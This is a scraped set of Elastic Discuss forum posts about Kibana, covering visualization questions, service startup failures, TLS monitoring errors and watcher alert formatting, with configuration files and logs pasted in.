    "body": "I tried to draw a graph \"Bandwidth usage of top five countries over time\" using the logs captured from apache servers. X-Axis -@timestamp per minute - I guess this means to create the buckets based on \"minutes\" - Am i right ? How can i see the bandwidth usage of top 5 countries at certain minute by mouse hovering the graph - as you in the image , it is showing only the top country at that moment ? Y- Axis - Currently it is showing as number of bytes - Is there anyway to show this scaled to MB or GB ? 2020-04-19 09_42_37-Window1186×607 69.4 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "709b9cc6-9761-4807-8642-012ef484e401",
    "url": "https://discuss.elastic.co/t/tsvb-table-is-there-a-way-to-sort-columns/227977",
    "title": "TSVB Table : is There a way to sort columns?",
    "category": [
      "Kibana"
    ],
    "author": "Hamza_BENNANI",
    "date": "April 14, 2020, 6:30pm April 15, 2020, 8:59am April 15, 2020, 1:08pm April 15, 2020, 1:48pm April 15, 2020, 2:06pm April 20, 2020, 7:42am",
    "body": "Hello, I would like to know if there is a way to sort columns in TSVB Table in Kibana 7.6.2. Anyway, my need is to compute the top 10 of customers based on their turn over. Also, the table must show in a third column, the evolution of the turn over compared to the last year for each customer. I was able to do that in TSVB Table but I cannot make a descending sort on the column 'turn over' to get only top 10 customers. regards, Hamza",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "195a98c3-a34e-4973-a544-76b384281b1b",
    "url": "https://discuss.elastic.co/t/document-without-id-in-kibana/228311",
    "title": "Document without ID in .kibana",
    "category": [
      "Kibana"
    ],
    "author": "Ludek",
    "date": "April 16, 2020, 11:54am April 16, 2020, 1:04pm April 20, 2020, 7:39am",
    "body": "Kinana created index pattern the-index-pattern*. But this record has no ID: GET .kibana/doc/_search?q=index-pattern.title:\"the-index-pattern*\" { \"took\" : 2, \"timed_out\" : false, \"_shards\" : { \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : 1, \"max_score\" : 10.247333, \"hits\" : [ { \"_index\" : \".kibana_10\", \"_type\" : \"doc\", \"_id\" : \"index-pattern-id\", \"_score\" : 10.247333, \"_source\" : { \"type\" : \"index-pattern\", \"index-pattern\" : { \"title\" : \"the-index-pattern*\", \"timeFieldName\" : \"@timestamp\" } } } ] } } Because of that, I cannot delete it. If I use \"click here to re-create it\", it does nothing. Any way to delete it? Using Kibana 6.8.8.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "73271043-ed77-4d35-9d72-b3688ec17014",
    "url": "https://discuss.elastic.co/t/kibana-service-fails-to-start/228766",
    "title": "Kibana service fails to start",
    "category": [
      "Kibana"
    ],
    "author": "syost",
    "date": "April 20, 2020, 2:54am April 20, 2020, 12:12am April 20, 2020, 12:17am April 20, 2020, 2:55am April 20, 2020, 2:46am April 20, 2020, 2:58am April 20, 2020, 5:46am",
    "body": "I have installed Kibana as shown here. Installation was successful and so I began to configure it as shown here by setting the following... server.port: 5601 server.host: \"localhost\" elasticsearch.hosts: [\"http://localhost:9200\"] I did not use the key elasticsearch.url because it has been deprecated. Upon this I have also turned on logging as such... logging.dest: \"/home/syost/kibanalog.txt\" logging.silent: false logging.quiet: false logging.verbose: true After this I have started the service as such... sudo systemctl start kibana After I have started the service I keep polling for the status via... sudo systemctl status kibana Polling four times approximately 2 seconds apart results in... [/etc] > sudo systemctl status kibana ● kibana.service - Kibana Loaded: loaded (/etc/systemd/system/kibana.service; enabled; vendor preset: disabled) Active: active (running) since Sun 2020-04-19 19:59:41 MDT; 4s ago Main PID: 5833 (node) CGroup: /system.slice/kibana.service └─5833 /usr/share/kibana/bin/../node/bin/node /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml Apr 19 19:59:41 a-s6bac55wo88z systemd[1]: Started Kibana. Apr 19 19:59:41 a-s6bac55wo88z systemd[1]: Starting Kibana... [/etc] > sudo systemctl status kibana ● kibana.service - Kibana Loaded: loaded (/etc/systemd/system/kibana.service; enabled; vendor preset: disabled) Active: activating (auto-restart) (Result: exit-code) since Sun 2020-04-19 19:59:45 MDT; 2s ago Process: 5833 ExecStart=/usr/share/kibana/bin/kibana -c /etc/kibana/kibana.yml (code=exited, status=1/FAILURE) Main PID: 5833 (code=exited, status=1/FAILURE) Apr 19 19:59:45 a-s6bac55wo88z systemd[1]: kibana.service: main process exited, code=exited, status=1/FAILURE Apr 19 19:59:45 a-s6bac55wo88z systemd[1]: Unit kibana.service entered failed state. Apr 19 19:59:45 a-s6bac55wo88z systemd[1]: kibana.service failed. [/etc] > sudo systemctl status kibana ● kibana.service - Kibana Loaded: loaded (/etc/systemd/system/kibana.service; enabled; vendor preset: disabled) Active: active (running) since Sun 2020-04-19 19:59:48 MDT; 3s ago Main PID: 5864 (node) CGroup: /system.slice/kibana.service └─5864 /usr/share/kibana/bin/../node/bin/node /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml Apr 19 19:59:48 a-s6bac55wo88z systemd[1]: Started Kibana. Apr 19 19:59:48 a-s6bac55wo88z systemd[1]: Starting Kibana... [/etc] > sudo systemctl status kibana ● kibana.service - Kibana Loaded: loaded (/etc/systemd/system/kibana.service; enabled; vendor preset: disabled) Active: failed (Result: start-limit) since Sun 2020-04-19 19:59:56 MDT; 2s ago Process: 5864 ExecStart=/usr/share/kibana/bin/kibana -c /etc/kibana/kibana.yml (code=exited, status=1/FAILURE) Main PID: 5864 (code=exited, status=1/FAILURE) Apr 19 19:59:53 a-s6bac55wo88z systemd[1]: kibana.service: main process exited, code=exited, status=1/FAILURE Apr 19 19:59:53 a-s6bac55wo88z systemd[1]: Unit kibana.service entered failed state. Apr 19 19:59:53 a-s6bac55wo88z systemd[1]: kibana.service failed. Apr 19 19:59:56 a-s6bac55wo88z systemd[1]: kibana.service holdoff time over, scheduling restart. Apr 19 19:59:56 a-s6bac55wo88z systemd[1]: start request repeated too quickly for kibana.service Apr 19 19:59:56 a-s6bac55wo88z systemd[1]: Failed to start Kibana. Apr 19 19:59:56 a-s6bac55wo88z systemd[1]: Unit kibana.service entered failed state. Apr 19 19:59:56 a-s6bac55wo88z systemd[1]: kibana.service failed. Logging never appears in /home/syost/kibanalog.txt and so I have nothing to go off of in determining why systemctl failed to start kibana service. I'm pasting in my entire config file should you see something I don't... # Kibana is served by a back end server. This setting specifies the port to use. server.port: 5601 # Specifies the address to which the Kibana server will bind. IP addresses and host names are both valid values. # The default is 'localhost', which usually means remote machines will not be able to connect. # To allow connections from remote users, set this parameter to a non-loopback address. server.host: \"localhost\" # Enables you to specify a path to mount Kibana at if you are running behind a proxy. # Use the `server.rewriteBasePath` setting to tell Kibana if it should remove the basePath # from requests it receives, and to prevent a deprecation warning at startup. # This setting cannot end in a slash. #server.basePath: \"\" # Specifies whether Kibana should rewrite requests that are prefixed with # `server.basePath` or require that they are rewritten by your reverse proxy. # This setting was effectively always `false` before Kibana 6.3 and will # default to `true` starting in Kibana 7.0. #server.rewriteBasePath: false # The maximum payload size in bytes for incoming server requests. #server.maxPayloadBytes: 1048576 # The Kibana server's name. This is used for display purposes. #server.name: \"your-hostname\" # The URLs of the Elasticsearch instances to use for all your queries. elasticsearch.hosts: [\"http://localhost:9200\"] # When this setting's value is true Kibana uses the hostname specified in the server.host # setting. When the value of this setting is false, Kibana uses the hostname of the host # that connects to this Kibana instance. #elasticsearch.preserveHost: true # Kibana uses an index in Elasticsearch to store saved searches, visualizations and # dashboards. Kibana creates a new index if the index doesn't already exist. #kibana.index: \".kibana\" # The default application to load. #kibana.defaultAppId: \"home\" # If your Elasticsearch is protected with basic authentication, these settings provide # the username and password that the Kibana server uses to perform maintenance on the Kibana # index at startup. Your Kibana users still need to authenticate with Elasticsearch, which # is proxied through the Kibana server. #elasticsearch.username: \"kibana\" #elasticsearch.password: \"pass\" # Enables SSL and paths to the PEM-format SSL certificate and SSL key files, respectively. # These settings enable SSL for outgoing requests from the Kibana server to the browser. #server.ssl.enabled: false #server.ssl.certificate: /path/to/your/server.crt #server.ssl.key: /path/to/your/server.key # Optional settings that provide the paths to the PEM-format SSL certificate and key files. # These files are used to verify the identity of Kibana to Elasticsearch and are required when # xpack.security.http.ssl.client_authentication in Elasticsearch is set to required. #elasticsearch.ssl.certificate: /path/to/your/client.crt #elasticsearch.ssl.key: /path/to/your/client.key # Optional setting that enables you to specify a path to the PEM file for the certificate # authority for your Elasticsearch instance. #elasticsearch.ssl.certificateAuthorities: [ \"/path/to/your/CA.pem\" ] # To disregard the validity of SSL certificates, change this setting's value to 'none'. #elasticsearch.ssl.verificationMode: full # Time in milliseconds to wait for Elasticsearch to respond to pings. Defaults to the value of # the elasticsearch.requestTimeout setting. #elasticsearch.pingTimeout: 1500 # Time in milliseconds to wait for responses from the back end or Elasticsearch. This value # must be a positive integer. #elasticsearch.requestTimeout: 30000 # List of Kibana client-side headers to send to Elasticsearch. To send *no* client-side # headers, set this value to [] (an empty list). #elasticsearch.requestHeadersWhitelist: [ authorization ] # Header names and values that are sent to Elasticsearch. Any custom headers cannot be overwritten # by client-side headers, regardless of the elasticsearch.requestHeadersWhitelist configuration. #elasticsearch.customHeaders: {} # Time in milliseconds for Elasticsearch to wait for responses from shards. Set to 0 to disable. #elasticsearch.shardTimeout: 30000 # Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying. #elasticsearch.startupTimeout: 5000 # Logs queries sent to Elasticsearch. Requires logging.verbose set to true. #elasticsearch.logQueries: false # Specifies the path where Kibana creates the process ID file. #pid.file: /var/run/kibana.pid # Enables you specify a file where Kibana stores log output. logging.dest: \"/home/syost/kibanalog.txt\" # Set the value of this setting to true to suppress all logging output. logging.silent: false # Set the value of this setting to true to suppress all logging output other than error messages. logging.quiet: false # Set the value of this setting to true to log all events, including system usage information # and all requests. logging.verbose: true # Set the interval in milliseconds to sample system and process performance # metrics. Minimum is 100ms. Defaults to 5000. #ops.interval: 5000 # Specifies locale to be used for all localizable strings, dates and number formats. # Supported languages are the following: English - en , by default , Chinese - zh-CN . #i18n.locale: \"en\"",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "8bd5f237-de75-49a8-b938-32dbd1e40ebe",
    "url": "https://discuss.elastic.co/t/covert-from-area-chart-to-line-chart/228699",
    "title": "Covert from Area Chart to Line chart",
    "category": [
      "Kibana"
    ],
    "author": "nages",
    "date": "April 19, 2020, 4:57am April 19, 2020, 7:51pm April 20, 2020, 2:57am",
    "body": "Is there anyway to convert from one visualization type to another visualization type - say from Area Chart to Line chart ? And also, how could i create a duplicate of a visualization ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "559b5039-8410-4cba-8545-151e384f0e7c",
    "url": "https://discuss.elastic.co/t/change-axis-color-in-time-series-visual-builder/225472",
    "title": "Change axis color in time series visual builder",
    "category": [
      "Kibana"
    ],
    "author": "jogabonito",
    "date": "March 27, 2020, 11:40pm March 30, 2020, 1:01pm April 20, 2020, 1:45am",
    "body": "Hi, I would like to change the axis color on my time series visual builder. Is this possible? Using Timelion visualization I can do it but I want to use the \"time series visual builder\" visualization. while using the white theme the axis color is grey and is hard to read. I have tried going into the code of the visualization using Saved object and Inspected the visualization but here I can only find color-codes on the graphs and not the axis.. Here is the code of the visualization: { \"title\": \"1.Graf\", \"type\": \"metrics\", \"params\": { \"id\": \"61ca57f0-469d-11e7-af02-69e470af7417\", \"type\": \"timeseries\", \"series\": [ { \"id\": \"61ca57f1-469d-11e7-af02-69e470af7417\", \"color\": \"rgba(0,156,224,1)\", \"split_mode\": \"everything\", \"metrics\": [ { \"id\": \"61ca57f2-469d-11e7-af02-69e470af7417\", \"type\": \"sum\", \"field\": \"totalUsage\" } ], \"separate_axis\": 0, \"axis_position\": \"left\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"5\", \"point_size\": \"5\", \"fill\": \"0.4\", \"stacked\": \"none\", \"label\": \"Totalforbruk [m3]\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"date\", \"split_color_mode\": \"gradient\", \"type\": \"timeseries\", \"series_interval\": \"1d\", \"series_drop_last_bucket\": 0 }, { \"id\": \"d5bc6d60-630a-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(115,255,246,1)\", \"split_mode\": \"everything\", \"metrics\": [ { \"id\": \"d5bc9470-630a-11ea-9d18-07f7f37b3b8b\", \"type\": \"avg\", \"field\": \"lastTemperatureWaterValue\" } ], \"separate_axis\": 1, \"axis_position\": \"right\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Vann temperatur (Målere) [°C]\", \"type\": \"timeseries\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"lastTemperatureWaterUtc\", \"axis_min\": \"-25\", \"axis_max\": \"40\", \"series_interval\": \"1d\" }, { \"id\": \"d6e36130-630a-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(226,115,0,1)\", \"split_mode\": \"everything\", \"metrics\": [ { \"id\": \"d6e36131-630a-11ea-9d18-07f7f37b3b8b\", \"type\": \"avg\", \"field\": \"lastTemperatureAirValue\" } ], \"separate_axis\": 1, \"axis_position\": \"right\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Lufttemperatur (Målere) [°C]\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"lastTemperatureAirUtc\", \"type\": \"timeseries\", \"axis_min\": \"-25\", \"axis_max\": \"40\", \"series_interval\": \"1d\" }, { \"id\": \"46af5ff0-630b-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(211,49,21,1)\", \"split_mode\": \"filter\", \"metrics\": [ { \"id\": \"46af5ff1-630b-11ea-9d18-07f7f37b3b8b\", \"type\": \"count\" } ], \"separate_axis\": 0, \"axis_position\": \"left\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"date\", \"terms_size\": \"15\", \"terms_field\": \"lastAlarmCode.keyword\", \"label\": \"Alarmcode 0 - Burst\", \"split_color_mode\": \"gradient\", \"value_template\": \"{{value}}\", \"terms_order_by\": \"_count\", \"axis_min\": \"0\", \"axis_max\": \"2000\", \"series_interval\": \"1d\", \"steps\": 0, \"filter\": { \"query\": \"lastAlarmCode : 0\", \"language\": \"kuery\" }, \"terms_include\": \"\"0\"\" }, { \"id\": \"7514b470-630c-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(252,220,0,1)\", \"split_mode\": \"filter\", \"metrics\": [ { \"id\": \"7514b471-630c-11ea-9d18-07f7f37b3b8b\", \"type\": \"count\" } ], \"separate_axis\": 0, \"axis_position\": \"left\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Alarmcode 1 - Dry\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"date\", \"split_filters\": [ { \"color\": \"rgba(171,20,158,1)\", \"id\": \"f17fe6b0-630c-11ea-9d18-07f7f37b3b8b\", \"filter\": { \"query\": \"\", \"language\": \"kuery\" } } ], \"filter\": { \"query\": \"lastAlarmCode : 1\", \"language\": \"kuery\" }, \"series_interval\": \"1d\", \"axis_max\": \"2000\", \"axis_min\": \"0\" }, { \"id\": \"78c20500-630c-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(250,40,255,1)\", \"split_mode\": \"filter\", \"metrics\": [ { \"id\": \"78c20501-630c-11ea-9d18-07f7f37b3b8b\", \"type\": \"count\" } ], \"separate_axis\": 0, \"axis_position\": \"left\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Alarmcode 2 - Leak + Burst\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"date\", \"split_filters\": [ { \"filter\": { \"query\": \"\", \"language\": \"kuery\" }, \"label\": \"\", \"color\": \"rgba(250,40,255,1)\", \"id\": \"f070c0a0-630c-11ea-9d18-07f7f37b3b8b\" } ], \"type\": \"timeseries\", \"filter\": { \"query\": \"lastAlarmCode : 2\", \"language\": \"kuery\" }, \"series_interval\": \"1d\", \"axis_max\": \"2000\", \"axis_min\": \"0\" }, { \"id\": \"79202a90-630c-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(164,221,0,1)\", \"split_mode\": \"filter\", \"metrics\": [ { \"id\": \"79202a91-630c-11ea-9d18-07f7f37b3b8b\", \"type\": \"count\" } ], \"separate_axis\": 0, \"axis_position\": \"left\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Alarmcode 3 - Leak\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"date\", \"split_filters\": [ { \"color\": \"rgba(164,221,0,1)\", \"id\": \"ef68ed90-630c-11ea-9d18-07f7f37b3b8b\", \"filter\": { \"query\": \"\", \"language\": \"kuery\" } } ], \"filter\": { \"query\": \"lastAlarmCode : 3\", \"language\": \"kuery\" }, \"series_interval\": \"1d\", \"axis_min\": \"0\", \"axis_max\": \"2000\" }, { \"id\": \"8c2f02f0-630c-11ea-9d18-07f7f37b3b8b\", \"color\": \"rgba(104,204,202,1)\", \"split_mode\": \"filter\", \"metrics\": [ { \"id\": \"8c2f02f1-630c-11ea-9d18-07f7f37b3b8b\", \"type\": \"count\" } ], \"separate_axis\": 0, \"axis_position\": \"left\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Alarmcode 4 - Reverse\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-dummydata-standardmodell\", \"series_time_field\": \"date\", \"split_filters\": [ { \"color\": \"rgba(174,161,255,1)\", \"id\": \"ee29b6d0-630c-11ea-9d18-07f7f37b3b8b\", \"filter\": { \"query\": \"\", \"language\": \"kuery\" } } ], \"filter\": { \"query\": \"lastAlarmCode : 4\", \"language\": \"kuery\" }, \"series_interval\": \"1d\", \"axis_min\": \"0\", \"axis_max\": \"2000\" }, { \"id\": \"1f52faa0-675e-11ea-a912-9d611185f582\", \"color\": \"rgba(253,161,255,1)\", \"split_mode\": \"filter\", \"metrics\": [ { \"id\": \"1f52faa1-675e-11ea-a912-9d611185f582\", \"type\": \"avg\", \"field\": \"temperatur\" } ], \"separate_axis\": 1, \"axis_position\": \"right\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": \"3\", \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Lufttemperatur (MET) [°C]\", \"type\": \"timeseries\", \"override_index_pattern\": 1, \"series_index_pattern\": \"sesam-klimadata*\", \"series_time_field\": \"dato\", \"split_filters\": [ { \"color\": \"#68BC00\", \"id\": \"2b7ed2e0-675e-11ea-a912-9d611185f582\", \"filter\": { \"query\": \"\", \"language\": \"kuery\" } } ], \"filter\": { \"query\": \"bruksomraade.keyword : \"Hvaler\" \", \"language\": \"kuery\" }, \"series_interval\": \"1h\" } ], \"time_field\": \"\", \"index_pattern\": \"\", \"interval\": \"1M\", \"axis_position\": \"left\", \"axis_formatter\": \"number\", \"axis_scale\": \"normal\", \"show_legend\": 1, \"show_grid\": 1, \"default_index_pattern\": \"sesam-dummydata-standardmodell\", \"default_timefield\": \"date\", \"isModelInvalid\": false }, \"aggs\": }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "add4445c-5d8d-45ce-85d9-27d5b18d7dcf",
    "url": "https://discuss.elastic.co/t/hostname-regex-matching-problem/228223",
    "title": "Hostname Regex Matching Problem",
    "category": [
      "Kibana"
    ],
    "author": "leander",
    "date": "April 16, 2020, 12:04am April 16, 2020, 8:31am April 19, 2020, 11:24pm",
    "body": "I am trying to get a kibana filter to match a hostname using regex Hostnames i am trying match eg. dpsp8091.domain.com dpsp8092.domain.com These examples are a few i have tried and failed with: Host: dpsp[8091 to 8092].domain.com Host: \"dpsp[8091 to 8092].domain.com\" Host: /dpsp<8091-8092>*/ Host: /dpsp[8091-8092].domain.com/ Any recommendations?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "94dc5885-2185-42e0-8dca-ced3d1c869aa",
    "url": "https://discuss.elastic.co/t/on-embedding-kibana-iframe-to-a-portal-kibana-dont-ask-for-any-credentials-even-after-basic-license-enabled/228647",
    "title": "On embedding Kibana Iframe to a portal, Kibana don't ask for any credentials even after Basic license enabled",
    "category": [
      "Kibana"
    ],
    "author": "Nitin_Khatri",
    "date": "April 18, 2020, 1:35pm April 19, 2020, 7:44pm April 19, 2020, 8:16pm",
    "body": "I have a Dashboard embedded to a portal, but kibana is not asking for any credentials. Dashboard aslo works fine and can be seen on portal directly, Why??",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cfd26b9b-92c4-49ef-b145-796cd1313c45",
    "url": "https://discuss.elastic.co/t/getting-visualize-unknown-error/228501",
    "title": "Getting Visualize:unknown error",
    "category": [
      "Kibana"
    ],
    "author": "kaviraj",
    "date": "April 17, 2020, 11:25am April 19, 2020, 7:57pm",
    "body": "Hello, While monitoring the application we have observed an error, if we kept the GUI idle for a while (5 minutes) we have seen this “Visualize:unknown error” But this issue is seen only in Microsoft Edge , sometimes in Mozilla Firefox and never seen in Chrome . Kibana version: 4.5 Elasticsearch version: 2.3",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ce297187-054f-4f11-8371-fb2f87a9ecfc",
    "url": "https://discuss.elastic.co/t/user-based-kibana-access-control/227646",
    "title": "User based kibana access control",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 12, 2020, 9:11am April 12, 2020, 9:10am April 13, 2020, 5:27pm April 14, 2020, 1:13pm April 17, 2020, 5:20am April 19, 2020, 7:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "afaf6e31-48d5-4bbe-b7aa-cb15034defe1",
    "url": "https://discuss.elastic.co/t/kibana-6-8-8-monitoring-request-error/228574",
    "title": "Kibana 6.8.8 - Monitoring Request Error",
    "category": [
      "Kibana"
    ],
    "author": "jwcw",
    "date": "April 17, 2020, 8:10pm April 22, 2020, 2:54am April 19, 2020, 6:25pm",
    "body": "I am receiving the following error on the Monitoring page in Kibana after configuring TLS to encrypt communications between nodes in the cluster. Monitoring Request Error [transport_exception] handshake failed because connection reset: Check the Elasticsearch Monitoring cluster network connection or the load level of the nodes. HTTP 503 Background: I set up a new elasticsearch 6.8.8 cluster with a separate server running Kibana. I have 3 master nodes, 2 data nodes, and 2 coordinating nodes plus the server running Kibana. In order to apply my license, I had to set up TLS and followed the documentation to configure. I applied the configurations to all of the elasticsearch nodes in the cluster, and only the elasticsearch nodes. I thought perhaps I had to apply the xpack transport configurations to Kibana so I did but this caused further issues (i.e. Kibana would not start). After reviewing this other discussion thread I see that these settings aren't supported by Kibana and I removed them (i.e. I removed the xpack.security.transport.ssl.* lines from kibana.yml and removed the xpack keystores I created). I'm now back where I started. Kibana starts, I can sign in, but the Monitoring page returns an HTTP 503. I have confirmed that the cluster is healthy: $ curl -X GET -k \"https://master-0:9200/_cat/nodes?pretty\" 10.10.1.5 30 86 1 0.07 0.05 0.04 di - data-0 10.10.1.10 5 95 1 0.13 0.05 0.01 i - client-1 10.10.1.7 5 95 0 0.13 0.03 0.01 mi - master-1 10.10.1.8 4 95 0 0.03 0.01 0.00 mi - master-2 10.10.1.9 5 95 1 0.00 0.02 0.00 mi * master-0 10.10.1.11 5 95 0 0.01 0.06 0.02 i - client-0 10.10.1.6 29 85 0 0.11 0.04 0.01 di - data-1 $ curl -X GET -k \"https://master-0:9200/_cat/health?pretty\" 1587153023 19:50:23 elasticsearch green 7 2 30 15 0 0 0 0 - 100.0% What is the Elasticsearch Monitoring cluster network connection? How can I resolve this issue?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "44211261-6aec-4b9e-a2d7-70c6bddf3fc9",
    "url": "https://discuss.elastic.co/t/exploitation-of-the-physical-cores-available-on-a-kibana-server/226756",
    "title": "Exploitation of the physical cores available on a Kibana server",
    "category": [
      "Kibana"
    ],
    "author": "Michael_Nicemen",
    "date": "April 7, 2020, 2:54pm April 6, 2020, 11:23pm April 7, 2020, 2:55pm April 9, 2020, 7:51am April 19, 2020, 4:55pm",
    "body": "Hi all, I'm testing a full Elastic Stack installation (v.7.6.0) and it seems Kibana web server (\"node\") is not trying to exploit at best the available cores on the server where it is up and running. Looking at the CPU load with the Linux system tool (\"top\", \"htop\", ecc) while Kibana is running what happens seems to be: at Kibana start time there are 1+10 processes running (1 parent and 10 children) as you can see in the following figure: IMG-19911140×501 141 KB then I start a stress test (using Jmeter) that sends (with a low throughput) requests to Kibana. Immediately the CPU load changes: the parent goes up more than 100% CPU; 4 children slowly take from 3 to 4 CPU percentage, and nothing else about the 6 others children (they stay at 0.0%). In the next capture image you can see the first threads ordered by CPU% running while the stresstest: IMG-1990911×366 107 KB So, in order to force Kibana to use and exploit all its 10 children, I repeat the stress test sending requests with a very huge throughput. But the load of the \"node\" processes doesn't change as you can see: IMG-1989898×491 157 KB Obviously the average response time of the stress test become very high and Kibana is not usable anymore by a web browser (along the stress test) because becomes unresponsive. Why Kibana doesn't try to exploit all the hardware resources? What I'm missing? Is there a way to increase the number of threads the \"node\" could use? Thanks in advance for any comments/hints. Best regards",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f644f291-66e1-4e01-84df-e231f74661e5",
    "url": "https://discuss.elastic.co/t/make-the-email-body-of-my-alert-easier-to-read/224773",
    "title": "Make the email body of my alert easier to read",
    "category": [
      "Kibana"
    ],
    "author": "Alexandros888",
    "date": "March 24, 2020, 7:13am March 25, 2020, 2:55pm March 26, 2020, 7:21am March 26, 2020, 9:15am March 26, 2020, 9:59am April 8, 2020, 1:06pm April 15, 2020, 3:23pm April 15, 2020, 4:06pm April 18, 2020, 2:14pm April 18, 2020, 2:28pm April 18, 2020, 4:41pm",
    "body": "Hello, I have created an advanced watcher alert in order to monitor for each of my hosts which transactions have an http status code 500 to 600 . My alert code is the one below: { \"trigger\": { \"schedule\": { \"cron\": [ \"0 * 0-1 * * ?\", \"0 * 3-22 * * ?\", \"0 15-59 23 * * ?\", \"0 58-59 2 * * ?\" ] } }, \"input\": { \"search\": { \"request\": { \"search_type\": \"query_then_fetch\", \"indices\": [ \"apm-*\" ], \"rest_total_hits_as_int\": true, \"body\": { \"size\": 0, \"query\": { \"bool\": { \"must_not\": { \"term\": { \"transaction.name\": \"TokenEndpoint#postAccessToken\" } }, \"must\": [ { \"terms\": { \"host.hostname\": [ \"sag-prd-cas-025.sag.services\", \"sag-prd-cas-026.sag.services\", \"sag-prd-cas-027.sag.services\", \"sag-prd-cas-028.sag.services\", \"sag-prd-cas-029.sag.services\", \"sag-prd-cas-030.sag.services\" ] } } ], \"filter\": [ { \"range\": { \"@timestamp\": { \"gte\": \"now-1m\" } } }, { \"range\": { \"http.response.status_code\": { \"gte\": 500, \"lte\": 600 } } } ] } }, \"aggs\": { \"hosts\": { \"terms\": { \"field\": \"host.hostname\" }, \"aggs\": { \"transactions\": { \"terms\": { \"field\": \"transaction.name\" }, \"aggs\": { \"status\": { \"terms\": { \"field\": \"http.response.status_code\" } } } } } } } } } } }, \"condition\": { \"compare\": { \"ctx.payload.hits.total\": { \"gt\": 30 } } }, \"actions\": { \"send_email\": { \"email\": { \"profile\": \"standard\", \"to\": [ \"alexandros.ananikidis@sag-ag.ch\" ], \"subject\": \"5xx HTTP status code dedected\", \"body\": { \"text\": \"The Watcher has detected {{ctx.payload.hits.total}} times a 5xx HTTP status code during the last 1 minute.\\n\\n The detailed results are the following: \\n\\n {{ctx.payload.aggregations.hosts.buckets}} \" } } } } } The alert works perfectly but the email body that i receive has a terrible structure for someone to read and understand where the http failures occure. The email that i get has the following body: The Watcher has detected 121 times a 5xx HTTP status code during the last 1 minute. The detailed results are the following: {0={doc_count=119, transactions={doc_count_error_upper_bound=0, sum_other_doc_count=0, buckets=[{doc_count=119, key=ArticlesController#getUpdatedAvailabilities, status={doc_count_error_upper_bound=0, sum_other_doc_count=0, buckets=[{doc_count=119, key=500}]}}]}, key=sag-prd-cas-029.sag.services}, 1={doc_count=2, transactions={doc_count_error_upper_bound=0, sum_other_doc_count=0, buckets=[{doc_count=1, key=ArticleSearchController#searchArticlesByCateIdsAndVehIds, status={doc_count_error_upper_bound=0, sum_other_doc_count=0, buckets=[{doc_count=1, key=500}]}}]}, key=sag-prd-cas-027.sag.services}} What can i do in order to show that info in a more nice and clear way? Thank you in advance",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "e919e575-cc3f-402a-bfd2-7b2d43fccacd",
    "url": "https://discuss.elastic.co/t/no-living-connections-unable-to-get-local-issuer-certificate/228581",
    "title": "No living connections - \"Unable to get local issuer certificate\"",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 18, 2020, 9:08am April 18, 2020, 1:01pm April 18, 2020, 1:54pm April 18, 2020, 3:57pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "54a5dde7-67e9-4eda-b81b-ada5541e8f1c",
    "url": "https://discuss.elastic.co/t/how-to-show-each-minute-data-points-in-line-charts/226628",
    "title": "How to show each minute data points in line charts",
